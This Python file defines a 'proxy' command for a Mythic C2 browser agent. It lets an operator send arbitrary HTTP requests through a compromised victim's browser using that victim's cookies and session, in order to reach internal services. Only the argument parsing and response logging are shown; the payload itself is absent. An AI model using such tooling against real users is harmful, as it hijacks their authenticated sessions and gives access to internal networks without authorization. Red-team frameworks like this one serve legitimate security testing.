from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class ProxyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="URL to request",
            ),
            CommandParameter(
                name="method",
                type=ParameterType.ChooseOne,
                choices=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"],
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="GET",
                description="HTTP method",
            ),
            CommandParameter(
                name="body",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="",
                description="Request body (for POST/PUT/PATCH)",
            ),
            CommandParameter(
                name="headers",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="",
                description='Request headers as JSON object (e.g. {"Content-Type":"application/json"})',
            ),
            CommandParameter(
                name="credentials",
                type=ParameterType.ChooseOne,
                choices=["include", "same-origin", "omit"],
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="include",
                description="Cookie/credential mode: include (send cookies cross-origin), same-origin, or omit",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a URL")
        if self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("url", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class ProxyCommand(CommandBase):
    cmd = "proxy"
    needs_admin = False
    help_cmd = 'proxy {"url":"http://internal.corp:8080/api/users","method":"GET"}'
    description = "Make HTTP requests from the victim's browser using their session/cookies. Useful for accessing internal resources, APIs, and services the victim can reach. Supports all HTTP methods, custom headers, and request bodies."
    version = 1
    author = "@grampae"
    attackmapping = ["T1090", "T1552.005"]
    argument_class = ProxyArguments
    browser_script = BrowserScript(script_name="proxy", author="@grampae", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS("Browser")]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        method = task.args.get_arg("method") or "GET"
        url = task.args.get_arg("url") or ""
        task.display_params = "{} {}".format(method, url)
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

        try:
            import json
            data = json.loads(response)
            url = data.get("url", "")
            status = data.get("status", "")
            method = data.get("method", "GET")
            if url and not data.get("error"):
                await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
                    TaskID=task.Task.ID,
                    ArtifactMessage="HTTP {} {} -> {}".format(method, url, status),
                    BaseArtifactType="URL Loaded"
                ))
        except Exception:
            pass

        return resp
